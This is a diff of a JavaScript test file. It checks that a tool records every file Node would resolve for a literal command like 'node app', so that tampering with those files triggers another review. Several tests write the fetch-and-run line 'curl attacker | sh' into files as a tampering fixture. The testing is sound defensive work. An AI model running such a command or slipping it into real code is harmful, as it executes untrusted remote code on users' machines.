@@ -58,9 +58,10 @@ describe('files a literal Project command runs', () => {
       await writeFile(join(checkout, 'server/index.js'), 'listen()');
       await writeFile(join(checkout, 'notdir'), 'file');
       const first = await readLiteralCommandExecutedFiles(checkout, checkout, 'node server; bash notdir/x.sh');
-      // Node loads a folder through package.json `main`, defaulting to index.js.
+      // Node tries server.js/.json/.node first, then the folder's package.json `main`, then index.js.
       expect(first).toEqual({ kind: 'read', files: [
         { file: 'notdir/x.sh', absent: true }, { file: 'server', directory: true },
+        { file: 'server.js', absent: true }, { file: 'server.json', absent: true }, { file: 'server.node', absent: true },
         { file: 'server/index.js', digest: expect.any(String) }, { file: 'server/package.json', absent: true },
       ] });
       await writeFile(join(checkout, 'server/index.js'), 'curl attacker | sh');
@@ -69,8 +70,11 @@ describe('files a literal Project command runs', () => {
       await writeFile(join(checkout, 'app/package.json'), JSON.stringify({ main: 'lib/start.js' }));
       // No candidate exists yet, so adding any of them asks again.
       expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'bun app')).toEqual({ kind: 'read', files: [
-        { file: 'app', directory: true }, { file: 'app/lib/start.js', absent: true }, { file: 'app/lib/start.js.cjs', absent: true },
-        { file: 'app/lib/start.js.js', absent: true }, { file: 'app/lib/start.js.mjs', absent: true }, { file: 'app/lib/start.js/index.js', absent: true },
+        { file: 'app', directory: true }, { file: 'app.js', absent: true }, { file: 'app.json', absent: true }, { file: 'app.node', absent: true },
+        { file: 'app/index.js', absent: true }, { file: 'app/index.json', absent: true }, { file: 'app/index.node', absent: true },
+        { file: 'app/lib/start.js', absent: true }, { file: 'app/lib/start.js.js', absent: true }, { file: 'app/lib/start.js.json', absent: true },
+        { file: 'app/lib/start.js.node', absent: true }, { file: 'app/lib/start.js/index.js', absent: true },
+        { file: 'app/lib/start.js/index.json', absent: true }, { file: 'app/lib/start.js/index.node', absent: true },
         { file: 'app/package.json', digest: expect.any(String) },
       ] });
     } finally { await rm(checkout, { recursive: true, force: true }); }
@@ -84,7 +88,7 @@ describe('files a literal Project command runs', () => {
       await writeFile(join(checkout, 'dist/server.js'), 'listen()');
       const first = await readLiteralCommandExecutedFiles(checkout, checkout, 'node .');
       expect(first).toEqual({ kind: 'read', files: [
-        { file: '.', directory: true }, { file: 'dist/server.js', digest: expect.any(String) },
+        { file: '.', directory: true }, { file: 'dist/server', absent: true }, { file: 'dist/server.js', digest: expect.any(String) },
         { file: 'package.json', digest: expect.any(String) },
       ] });
       await writeFile(join(checkout, 'dist/server.js'), 'curl attacker | sh');
@@ -107,9 +111,22 @@ describe('files a literal Project command runs', () => {
       expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node app')).not.toEqual(first);
       // Nothing resolves yet: every candidate is recorded, so adding one asks again.
       expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node missing')).toEqual({ kind: 'read', files: [
-        { file: 'missing', absent: true }, { file: 'missing.cjs', absent: true }, { file: 'missing.js', absent: true },
-        { file: 'missing.mjs', absent: true }, { file: 'missing/index.js', absent: true },
+        { file: 'missing', absent: true }, { file: 'missing.js', absent: true }, { file: 'missing.json', absent: true },
+        { file: 'missing.node', absent: true },
       ] });
+    } finally { await rm(checkout, { recursive: true, force: true }); }
+  });
+
+  it('reviews app.js before the app folder, as Node resolves `node app`', async () => {
+    const checkout = await mkdtemp(join(tmpdir(), 'happier-literal-files-'));
+    try {
+      await mkdir(join(checkout, 'app'));
+      await writeFile(join(checkout, 'app/index.js'), 'folder()');
+      await writeFile(join(checkout, 'app.js'), 'file()');
+      const first = await readLiteralCommandExecutedFiles(checkout, checkout, 'node app');
+      expect(first).toEqual({ kind: 'read', files: [{ file: 'app', directory: true }, { file: 'app.js', digest: expect.any(String) }] });
+      await writeFile(join(checkout, 'app.js'), 'curl attacker | sh');
+      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node app')).not.toEqual(first);
     } finally { await rm(checkout, { recursive: true, force: true }); }
   });
 
